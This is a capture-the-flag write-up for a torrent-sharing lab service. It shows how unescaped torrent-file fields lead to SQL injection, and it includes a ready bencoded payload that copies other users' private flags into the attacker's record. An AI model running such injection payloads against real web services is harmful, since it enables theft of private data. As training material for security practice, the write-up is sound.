## Description

The Pirate Bay is a web-service for sharing torrent files. It is Written in **Python 3.5** as the programming language, **CherryPy** as the web framework and **sqlite3** as the database client. Service allows us mark file as private. Private files are available only for user who uploaded this files. Flags are comments in private torrent files.

## Vulnerability
There is a classic SQL injection. All content of fields on web pages and user data are escaped excludes the fields from the torrent file.

### Torrent file structure

[Torrent file](https://en.wikipedia.org/wiki/Torrent_file) is a [bencoded](https://en.wikipedia.org/wiki/Bencode) associative array with the following keys(some optional keys are omitted):

* announce - the URL of the tracker
* info - this maps to a dictionary whose keys are dependent on whether one or more files are being shared:
	* files - a list of dictionaries each corresponding to a file (only when multiple files are being shared). Each dictionary has the following keys:
		* length - size of the file in bytes
		* path - a list of strings corresponding to subdirectory names, the last of which is the actual file name
	* length - size of the file in bytes (only when one file is being shared)
	* name - suggested filename where the file is to be saved (if one file)/suggested directory name where the files are to be saved (if multiple files)
	* piece length - number of bytes per piece
	* pieces - a hash list
	* comment - text description of the torrent file (optional)

### Database analysis

Let's watch database tables for finding fields with similar column names.
At first we should find the file which associated with our database. We can see this info in `db/client.py` file:

```python
...
class DBClient(metaclass=Singleton):
    def __init__(self):
        self.connection = sqlite3.connect(DATABASE_FULL_PATH, check_same_thread=False)

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.connection.close()
```
`DATABASE_FULL_PATH` is a necessary file path.

Now open this file with **sqlite**:
![sqlite table](https://goo.gl/66Xdos)

Table **PrivateTorrentFile** contains following columns *announce*, *length*, *comment*, *name*, *uid*, *upload_by*, *content*.
Columns *announce*, *length*, *comment*, *name* are directly copies from torrent file without escaping.

### Hacking

For successful SQL injection we should change our torrent file fields such a way as to **insert query** put to our table some interesting information.

Let's watch **db/client** file again. There is a constructor of **insert query**:

```python
...
class InsertQuery:
    def __init__(self, tbl_name, field_names, values):
        self.query = "INSERT INTO {tbl_name} ({field_names}) VALUES ({values});".format(
            tbl_name=tbl_name,
            field_names=', '.join(field_names),
            values=", ".join(value for value in values)
        )
...
```
The simplest way to understand how to build necessary **insert query** is:
1. Add `print(self.query)` at the end of `__init__` method for printing query
2. Remove line `environment = "production"` from the `webserver/webserver.config` for
enable debug messages from stdout
3. Restart a service with `sudo docker-compose stop`, then `sudo docker-compose up`

Thus every **insert query** now prints to our console:
![insert query printing](http://joxi.ru/MAjEbeVSvNRZ42.png)

It's clear that a following torrent file:
```python
{
	'announce': 'ructfe.org',
	'info': {
			'length': 4526,
			'name': 'Chocolate Chip Cookie',
			'piece length': 1024,
			'pieces': '...',
			'comment': 'G9O3ODKXJAESQ58BCGWJ5EAYMOJM0ZR='
		}
	}
}
```
turns into query `INSERT INTO PrivateTorrentFile (announce, comment, content, length, name, uid, upload_by) VALUES ('ructfe.org', 'G9O3ODKXJAESQ58BCGWJ5EAYMOJM0ZR=', '...', '4526', 'Chocolate Chip Cookie', <some uid>, <user login>);`

For SQL injection we need some **insert query** like this: `INSERT INTO PrivateTorrentFile (announce, comment, content, length, name, uid, upload_by) VALUES (''||<select query>||'', ...);`

*Operator || is a concatenation of strings in sqlite.*

#### Making query
We can steal flag directly from **PrivateTorrentFile** table:
`INSERT INTO PrivateTorrentFile (announce, comment, content, length, name, uid, upload_by) VALUES (''||(SELECT comment FROM PrivateTorrentFile WHERE comment LIKE '%=' ORDER BY UID DESC limit 1)||'', '', '', 0, '0', '', <hacker_username>);`

#### Perform query
So, we now can detect the necessary query. How to execute it?

At first it is need to go from our query to exact torrent file. I.e. build associative array:
```python
{
    'announce': '0',
    'info': {
        'length': 0,
        'name': '',
        'piece length': 0,
        'pieces': '',
        'comment': "'||(SELECT comment FROM PrivateTorrentFile WHERE comment LIKE '%=' ORDER BY UID DESC limit 1)||'"
        }
    }
}
```
Then, generate torrent file with using function `make_dictionary` from `torrent_format/bencoder`:
`d8:announce0:4:infod7:comment96:'||(SELECT comment FROM PrivateTorrentFile WHERE comment LIKE '%=' ORDER BY UID DESC limit 1)||'6:lengthi0e4:name0:12:piece lengthi0e6:pieces0:ee`

Finally, make POST request with uploading this file to `/upload_private`. Now we successfully executed our **insert query**.

Stolen Flag is already in the **PrivateTorrentFile** table.
